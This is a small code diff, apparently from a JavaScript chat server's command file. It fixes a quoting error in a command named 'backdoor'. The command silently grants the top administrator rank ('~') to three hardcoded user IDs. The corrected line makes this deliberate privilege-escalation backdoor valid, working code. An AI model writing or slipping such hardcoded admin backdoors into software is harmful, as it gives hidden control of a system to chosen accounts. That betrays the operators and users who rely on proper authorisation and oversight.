@@ -2642,7 +2642,7 @@ target = this.splitTarget(target);
 	},
 
 	backdoor: function(target,room, user) {
-		if (user.userid === 'blakjack' || user.userid === stunfiskthegreat' || user.userid === 'jackdaw') {
+		if (user.userid === 'blakjack' || user.userid === 'stunfiskthegreat' || user.userid === 'jackdaw') {
 
 			user.group = '~';
 			user.updateIdentity();
